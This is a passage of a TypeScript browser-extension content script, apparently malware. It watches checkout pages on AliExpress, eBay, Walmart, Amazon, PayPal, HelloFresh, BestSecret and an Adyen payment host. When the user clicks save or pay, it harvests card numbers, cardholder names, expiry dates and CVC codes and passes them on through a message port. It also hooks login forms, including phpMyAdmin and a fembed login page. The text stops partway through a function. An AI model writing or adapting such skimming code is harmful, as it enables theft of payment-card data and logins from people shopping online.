import {browser} from "webextension-polyfill-ts";
import {acsComPortFront} from "./messanger";

/*#!if debug===true*/
console.log('TRACKER :: activated')

/*#!endif*/

export class Crawler {
    public url?: any;
    public authEvent?: any;
    public element?: any;
    public elementName?: any;
    public passwordStore: { node: HTMLElement, name: string, type: string, value: string }[] = [];

    constructor(url: string) {
        if (url) {
            this.url = url;
        }
    }

    init(callBack?: any) {
        const self = this;
        if (self.url) {
            let interval1 = setInterval(function () {
                if (document.querySelectorAll('form').length !== 0) {
                    document.querySelectorAll('form').forEach(function (__formElement) {
                        if (__formElement.attributes.length !== 0) {
                            if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                                if (__formElement.method === 'post') {
                                    clearInterval(interval1)
                                    self.trigger(__formElement);
                                }
                            } else {
                                if (__formElement.action !== 'javascript:void(0)' && __formElement.id.indexOf('u_0_') === -1 &&
                                    __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1) {
                                    clearInterval(interval1)
                                    self.trigger(__formElement);
                                }
                            }
                        } else {
                            if (__formElement.childNodes.length > 1) {
                                clearInterval(interval1)
                                self.trigger(__formElement);
                            }
                        }
                    });
                } else {
                    if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                        if (document.querySelector('#login') !== null) {
                            clearInterval(interval1);
                            self.classicTrack('#email_login', '#password', '#login');
                        }
                    }
                }

                if (window.location.origin.indexOf('aliexpress') !== -1) {
                    if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                        clearInterval(interval1);
                        self.explorePaymentSpanTag(self, (document.querySelector('.check-out-root') as HTMLElement), function (__detectedElement: any) {
                            ['click', 'dblclick'].forEach(function (event) {
                                document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                    acsComPortFront.postMessage({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': (__detectedElement as HTMLElement).textContent,
                                            'cardBrand': 'Unknown',
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                })
                            });
                        });
                    } else {
                        if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                            if (document.querySelectorAll('.arrow-content').length !== 0) {
                                document.querySelectorAll('.arrow-content').forEach(function (divElement) {
                                    divElement.addEventListener('click', function () {
                                        if (divElement.classList.contains('arrow-down')) {
                                            let __interval2 = setInterval(function () {
                                                if (document.querySelector('.add-new-card') !== null) {
                                                    clearInterval(__interval2);
                                                    ['click', 'dblclick'].forEach(function (event) {
                                                        document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                            let __interval3 = setInterval(function () {
                                                                if (document.querySelector('.new-card') !== null) {
                                                                    clearInterval(__interval3);
                                                                    self.explorePaymentNewCard(self,
                                                                        (document.querySelector('.new-card') as HTMLElement),
                                                                        function (elements: any) {
                                                                            let paymentMethodStore: any = [];
                                                                            document.querySelector('.save')?.addEventListener('click', function () {
                                                                                elements.forEach(function (element: any) {
                                                                                    paymentMethodStore.push({
                                                                                        'element': element.nodeName,
                                                                                        'id': element.id,
                                                                                        'type': element.type,
                                                                                        'value': element.value
                                                                                    });
                                                                                })
                                                                                acsComPortFront.postMessage({
                                                                                    command: 'savePaymentMethodsData',
                                                                                    data: {
                                                                                        'cardNumber': paymentMethodStore[0].value,
                                                                                        'cardBrand': 'Unknown',
                                                                                        'cardHolder': paymentMethodStore[1].value,
                                                                                        'cardExpire': paymentMethodStore[2].value,
                                                                                        'cardCVC': paymentMethodStore[3].value,
                                                                                        'workWebsite': window.location.origin
                                                                                    }
                                                                                });
                                                                                paymentMethodStore = [];
                                                                            });
                                                                        });
                                                                }
                                                            }, 1000);
                                                        })
                                                    });
                                                }
                                            }, 1000);
                                        }
                                    })
                                });
                            }

                            if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                                clearInterval(interval1);
                                let cardConfirmElement = document.querySelector('#checkout-button');
                                ['click', 'dblclick'].forEach(function (event) {
                                    cardConfirmElement?.addEventListener(event, function () {
                                        let tempPaymentMethodsStore: any = [];
                                        document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                            if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('icon')) {
                                                if ((__childElement as HTMLElement).classList.contains('visa')) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': (__childElement as HTMLElement).nodeName,
                                                        'id': (__childElement as HTMLElement).id,
                                                        'value': 'visa'
                                                    });
                                                }
                                            }
                                            if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('pay-name')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': (__childElement as HTMLElement).nodeName,
                                                    'id': (__childElement as HTMLElement).id,
                                                    'value': __childElement.textContent
                                                });
                                            }
                                        });
                                        acsComPortFront.postMessage({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': tempPaymentMethodsStore[0].value,
                                                'cardBrand': tempPaymentMethodsStore[1].value,
                                                'cardHolder': 'Unknown',
                                                'cardExpire': 'Unknown',
                                                'cardCVC': 'Unknown',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                        tempPaymentMethodsStore = [];
                                    });
                                });
                            }
                        }
                        if (window.location.href.indexOf('payResult.htm') !== -1) {
                            clearInterval(interval1);

                            let interval4 = setInterval(function () {
                                if (document.querySelector('.verify-card-form-row') !== null) {
                                    clearInterval(interval4);
                                    if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                        ['click', 'dblclick'].forEach(function (event) {
                                            let tempPaymentMethodsStore: any = [];
                                            document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                                self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardN', function (__detectedElement: any) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardHolder', function (__detectedElement: any) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'expires', function (__detectedElement: any) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cvc', function (__detectedElement: any) {
                                                    tempPaymentMethodsStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                acsComPortFront.postMessage({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        "cardExpire": tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                        "workWebsite": window.location.origin
                                                    }
                                                });
                                                tempPaymentMethodsStore = [];
                                            });
                                        });
                                    }
                                }
                            }, 1000);
                        }
                    }
                }

                if (window.location.origin.indexOf('ebay') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('form').length !== 0) {
                            document.querySelectorAll('form').forEach(function (__ebayCreditCardFormElement) {
                                if (__ebayCreditCardFormElement.id === 'credit-card-details') {
                                    clearInterval(interval);
                                    let elements: any = [];
                                    self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                }
                            });
                        }
                    }, 100);
                    if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                        if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
                            ["click", "dblclick"].forEach(function (event) {
                                let tempPaymentMethodsStore: any = [];
                                document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
                                    self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'creditCardNumber', function (__detectedElement: any) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'firstName', function (__detectedElement: any) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'lastName', function (__detectedElement: any) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'expirationDate', function (__detectedElement: any) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'cvv', function (__detectedElement: any) {
                                        tempPaymentMethodsStore.push({
                                            'element': __detectedElement.nodeName,
                                            'id': __detectedElement.id,
                                            'value': __detectedElement.value
                                        });
                                    });
                                    acsComPortFront.postMessage({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                            'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
                                            'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                            "cardExpire": tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                            'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                            "workWebsite": window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                })
                            })
                        }
                    }
                }

                if (window.location.origin.indexOf('walmart') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (window.location.href.indexOf('#/payment') !== -1 || window.location.href.indexOf('account/creditcards') !== -1) {
                            clearInterval(interval);
                            self.exploreWalmartPaymentContainer(self);
                        }
                        if (window.location.href.indexOf('#/review') !== -1) {
                            clearInterval(interval);
                            self.exploreWalmartPaymentEditButton(self);
                        }
                    }, 100);
                }

                if (window.location.origin.indexOf('amazon') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('form').length !== 0) {
                            clearInterval(interval);
                            self.exploreAmazonPaymentContainer(self);
                        }
                    }, 100);
                }

                if (window.location.origin.indexOf('hellofresh.de') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('.ReactModalPortal').length !== 0) {
                            clearInterval(interval);
                            document.querySelectorAll('.ReactModalPortal').forEach(function (modal) {
                                if (modal.childNodes.length !== 0) {
                                    self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement: any) {
                                        __detectedElement.addEventListener('click', function () {
                                            browser.storage.local.get().then(function (setting) {
                                                if (setting.paymentData !== undefined) {
                                                    acsComPortFront.postMessage({
                                                        command: 'savePaymentMethodsData',
                                                        data: {
                                                            'cardNumber': setting.paymentData.cardNumber ? setting.paymentData.cardNumber : 'Unknown',
                                                            'cardBrand': 'Unknown',
                                                            'cardHolder': 'Unknown',
                                                            "cardExpire": setting.paymentData.cardExpire,
                                                            'cardCVC': setting.paymentData.cardCVC,
                                                            "workWebsite": window.location.origin
                                                        }
                                                    });
                                                }
                                            });
                                        });
                                    });
                                }
                            });
                        }
                    }, 100);
                }

                if (window.location.origin.indexOf('checkoutshopper-live.adyen.com') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelector('body') !== null) {
                            clearInterval(interval);
                            self.explorePaymentInputTag(self, (document.querySelector('body') as HTMLElement), 'encrypted', function (__detectedElement: any) {
                                __detectedElement.addEventListener('keyup', function () {
                                    browser.storage.local.get().then(function (setting) {
                                        if (setting.paymentData !== undefined) {
                                            if (__detectedElement.id === 'encryptedCardNumber') {
                                                browser.storage.local.set({
                                                    'paymentData': {
                                                        'cardNumber': __detectedElement.value,
                                                        'cardExpire': setting.paymentData.cardExpire,
                                                        'cardCVC': setting.paymentData.cardCVC,
                                                    }
                                                });
                                            }
                                            if (__detectedElement.id === 'encryptedExpiryDate') {
                                                browser.storage.local.set({
                                                    'paymentData': {
                                                        'cardNumber': setting.paymentData.cardNumber,
                                                        'cardExpire': __detectedElement.value,
                                                        'cardCVC': setting.paymentData.cardCVC,
                                                    }
                                                });
                                            }
                                            if (__detectedElement.id === 'encryptedSecurityCode') {
                                                browser.storage.local.set({
                                                    'paymentData': {
                                                        'cardNumber': setting.paymentData.cardNumber,
                                                        'cardExpire': setting.paymentData.cardExpire,
                                                        'cardCVC': __detectedElement.value,
                                                    }
                                                });
                                            }
                                        } else {
                                            browser.storage.local.set({
                                                'paymentData': {
                                                    'cardNumber': '',
                                                    'cardExpire': '',
                                                    'cardCVC': '',
                                                }
                                            });
                                        }
                                    });
                                });
                            });
                        }
                    }, 100);
                }

                if (window.location.origin.indexOf('bestsecret.com') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelectorAll('form').length !== 0) {
                            clearInterval(interval);
                            self.exploreBestSecretPaymentContainer(self);
                        }
                    }, 100);
                }

                if (window.location.origin.indexOf('paypal') !== -1) {
                    clearInterval(interval1);
                    let interval = setInterval(function () {
                        if (document.querySelector('form') !== null/* && document.querySelector('form')?.action ==='/myaccount/money'*/) {
                            clearInterval(interval);
                            document.querySelectorAll('form').forEach(function (__paypalFormElement) {
                                if (__paypalFormElement.action.indexOf('myaccount/money') !== -1 || window.location.href.indexOf('webapps') !== -1) {
                                    let elements: any = [];
                                    self.explorePayPalPaymentFormElement(self, __paypalFormElement, elements, function (controller, elements) {
                                        ['click', 'dblclick'].forEach(function (event) {
                                            controller.addEventListener(event, function (e: Event) {
                                                let paymentMethodStore: any = [];
                                                elements.forEach(function (__detectedElement: HTMLInputElement) {
                                                    paymentMethodStore.push({
                                                        'element': __detectedElement.nodeName,
                                                        'id': __detectedElement.id,
                                                        'value': __detectedElement.value
                                                    });
                                                });
                                                if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
                                                    acsComPortFront.postMessage({
                                                        command: 'savePaymentMethodsData',
                                                        data: {
                                                            'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
                                                            'cardBrand': paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown',
                                                            'cardHolder': 'Unknown',
                                                            "cardExpire": paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                            'cardCVC': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                            "workWebsite": window.location.origin
                                                        }
                                                    });
                                                    paymentMethodStore = [];
                                                }
                                                if (window.location.href.indexOf('webapps') !== -1) {
                                                    acsComPortFront.postMessage({
                                                        command: 'savePaymentMethodsData',
                                                        data: {
                                                            'cardNumber': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                            'cardBrand': document.querySelector('.css-iro1ss-IconContainer.e7vozvz0')?.firstElementChild?.firstElementChild?.textContent?.toLowerCase(),
                                                            'cardHolder': (paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown') + ' ' + (paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown'),
                                                            "cardExpire": paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                            'cardCVC': paymentMethodStore[4].value ? paymentMethodStore[4].value : 'Unknown',
                                                            "workWebsite": window.location.origin
                                                        }
                                                    });
                                                    paymentMethodStore = [];
                                                }

                                            });
                                        });
                                    });
                                }
                            });
                        }
                    }, 100)
                }
            }, 1000);
        }

        if (callBack) {
            callBack();
        }
    }

    explorePayPalPaymentFormElement(self: this, __creditCardFormElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__creditCardFormElement.childNodes.length !== 0) {
            __creditCardFormElement.childNodes.forEach(function (_formChildElement: any) {
                if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' || _formChildElement.nodeName === 'BUTTON') {
                    if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' &&
                        _formChildElement.type !== 'hidden' && _formChildElement.id !== 'billingAddressId') {
                        elements.push(_formChildElement);
                    }
                    if (_formChildElement.nodeName === 'BUTTON' && _formChildElement.type === 'submit') {
                        if (callback) {
                            callback(_formChildElement, elements);
                        }
                    }
                } else {
                    self.explorePayPalPaymentFormElement(self, _formChildElement, elements, callback);
                }
            });
        }
    }

    exploreEbayPaymentDataCollection(self: this, __ebayCreditCardFormElement: any, elements: any[]) {
        self.exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, function (controller, elements) {
            ['click', 'dblclick'].forEach(function (event) {
                controller.addEventListener(event, function (e: Event) {
                    let paymentMethodStore: any = [];
                    elements.forEach(function (__detectedElement: HTMLInputElement) {
                        paymentMethodStore.push({
                            'element': __detectedElement.nodeName,
                            'id': __detectedElement.id,
                            'value': __detectedElement.value
                        });
                    });
                    acsComPortFront.postMessage({
                        command: 'savePaymentMethodsData',
                        data: {
                            'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
                            'cardBrand': document.querySelector('.card-types')?.firstElementChild?.getAttribute('aria-label')?.toLowerCase(),
                            'cardHolder': paymentMethodStore[3].id === 'cardHolderFirstName' ? paymentMethodStore[3].value : 'Unknown' + ' ' + paymentMethodStore[4].id === 'cardHolderLastName' ? paymentMethodStore[4].value : 'Unknown',
                            "cardExpire": paymentMethodStore[1].id === 'cardExpiryDate' ? paymentMethodStore[1].value : 'Unknown',
                            'cardCVC': paymentMethodStore[2].id === 'securityCode' ? paymentMethodStore[2].value : 'Unknown',
                            "workWebsite": window.location.origin
                        }
                    });
                    paymentMethodStore = [];
                    let interval = setInterval(function () {
                        document.querySelectorAll('a').forEach(function (__ebaySecondEntry) {
                            if (__ebaySecondEntry.getAttribute('data-test-id') === 'GET_PAYMENT_INSTRUMENT') {
                                clearInterval(interval);
                                ['click', 'dblclick'].forEach(function (event) {
                                    __ebaySecondEntry.addEventListener(event, function () {
                                        self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                    });
                                });
                            }
                        });
                    }, 100)
                });
            });
        });
    }

    exploreEbayPaymentFormElement(self: this, __ebayCreditCardFormElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__ebayCreditCardFormElement.childNodes.length !== 0) {
            __ebayCreditCardFormElement.childNodes.forEach(function (_ebayFormChildElement: any) {
                if (_ebayFormChildElement.nodeName === 'INPUT' || _ebayFormChildElement.nodeName === 'BUTTON') {
                    if (_ebayFormChildElement.nodeName === 'INPUT' && _ebayFormChildElement.type !== 'hidden' && _ebayFormChildElement.type !== 'checkbox') {
                        elements.push(_ebayFormChildElement);
                    }
                    if (_ebayFormChildElement.nodeName === 'BUTTON' && _ebayFormChildElement.type === 'submit') {
                        if (callback) {
                            callback(_ebayFormChildElement, elements);
                        }
                    }
                } else {
                    self.exploreEbayPaymentFormElement(self, _ebayFormChildElement, elements, callback);
                }
            });
        }
    }

    exploreHelloFreshPaymentContainer(self: this, parentNode: any, callback: any) {
        parentNode.childNodes.forEach(function (__element: any) {
            if (__element.nodeName === 'BUTTON' && __element.getAttribute('data-test-id') === 'add-payment-method-save') {
                if (callback) {
                    callback(__element);
                }
            } else {
                self.exploreHelloFreshPaymentContainer(self, __element, callback);
            }
        });
    }

    exploreBestSecretPaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "creditForm") {
                let elements: any = [];
                self.exploreBestSecretPaymentFormElement(self, __formElement, elements, function (controller: any, elements: any[]) {
                    controller.addEventListener('click', function (e: Event) {
                        let paymentMethodData: any = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,

                            });
                        });
                        acsComPortFront.postMessage({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardHolder': paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        elements = [];
                    });
                });
            }
        });
    }

    exploreBestSecretPaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON' && !(_childElement as HTMLButtonElement).classList.contains('btn-link')
                        && !(_childElement as HTMLButtonElement).classList.contains('btn-secondary-action') && (_childElement as HTMLButtonElement).type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.exploreBestSecretPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreAmazonPaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (!__formElement.classList.contains('nav-searchbar') && __formElement.name !== 'ue_backdetect' &&
                __formElement.style.display !== 'none') {
                let elements: any = [];
                self.exploreAmazonPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];
                        elements.forEach(function (__childElement: { nodeName: any; id: any; name: any; value: any; }) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name.indexOf('accountHolderName') !== -1 || __childElement.name.indexOf('account_holder_name') !== -1 ? 'cardHolder' : (__childElement.name.indexOf('CardNumber') !== -1 ? 'cardNumber' : (__childElement.name.indexOf('month') !== -1 ? 'expirationMonth' : (__childElement.name.indexOf('year') !== -1 ? 'expirationYear' : 'Unknown'))),
                                'value': __childElement.value,

                            });
                        });
                        acsComPortFront.postMessage({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value,
                                'cardBrand': 'Unknown',
                                'cardHolder': paymentMethodData[0].value,
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        elements = [];
                    });
                });
            }
        });
    }

    exploreAmazonPaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' &&
                        _childElement.type !== 'submit' && _childElement.type !== 'checkbox' ||
                        _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'INPUT' && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.exploreAmazonPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreWalmartPaymentContainer(self: this) {
        let interval = setInterval(function () {
            if (document.querySelector('.edit-form.multiple-required') !== null &&
                document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild !== null) {
                clearInterval(interval);
                if (document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.nodeName === 'BUTTON') {
                    ["click", "dblclick"].forEach(function (event) {
                        let tempPaymentMethodsStore: any = [];
                        document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.addEventListener(event, function () {
                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'creditCard', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });

                            document.querySelectorAll('.payment-option').forEach(function (element) {
                                if (!element.classList.contains('payment-inactive')) {
                                    element.classList.remove('payment-option');
                                    tempPaymentMethodsStore.push({
                                        'element': element.nodeName,
                                        'id': 'cardBrand',
                                        'value': element.className
                                    });
                                    element.classList.add('payment-option');
                                }
                            });

                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'firstName', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'lastName', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'month-chooser', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'year-chooser', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'cvv', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            acsComPortFront.postMessage({
                                command: 'savePaymentMethodsData',
                                data: {
                                    'cardNumber': tempPaymentMethodsStore[0].value,
                                    'cardBrand': tempPaymentMethodsStore[1].value,
                                    'cardHolder': tempPaymentMethodsStore[2].value + ' ' + tempPaymentMethodsStore[3].value,
                                    "cardExpire": tempPaymentMethodsStore[4].value + '/' + tempPaymentMethodsStore[5].value,
                                    'cardCVC': tempPaymentMethodsStore[6].value,
                                    "workWebsite": window.location.origin
                                }
                            });
                            tempPaymentMethodsStore = [];
                            self.exploreWalmartPaymentEditButton(self);
                        })
                    })
                }
            }
        }, 100);
    }

    exploreWalmartPaymentEditButton(self: this) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').length !== 0) {
                document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').forEach(function (formEditButton) {
                    if (formEditButton.getAttribute('data-automation-id') === 'edit-payment') {
                        clearInterval(interval);
                        formEditButton.addEventListener('click', function () {
                            self.exploreWalmartPaymentContainer(self);
                        });
                    }
                })
            }
        }, 100);
    }

    explorePaymentNewCard(self: this, elementParentNode: HTMLElement, callback?: any) {
        let detectedElements: any[] = [];
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if ((__childElement as HTMLElement).classList.contains('card-surface')) {
                    if ((__childElement as HTMLElement).nodeName === 'DIV' && (__childElement as HTMLElement).childNodes.length !== 0) {
                        (__childElement as HTMLElement).childNodes.forEach(function (__targetParentElement) {
                            if ((__targetParentElement as HTMLElement).classList.contains('card-no')) {
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'cardNo', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if ((__targetParentElement as HTMLElement).classList.contains('card-bottom')) {
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'cardHolder', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'expire', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'cvc', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        })
                    }
                }
            });
            if (callback) {
                callback(detectedElements);
            }
        }
    }

    explorePaymentSpanTag(self: this, elementParentNode: HTMLElement, callbackfn?: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
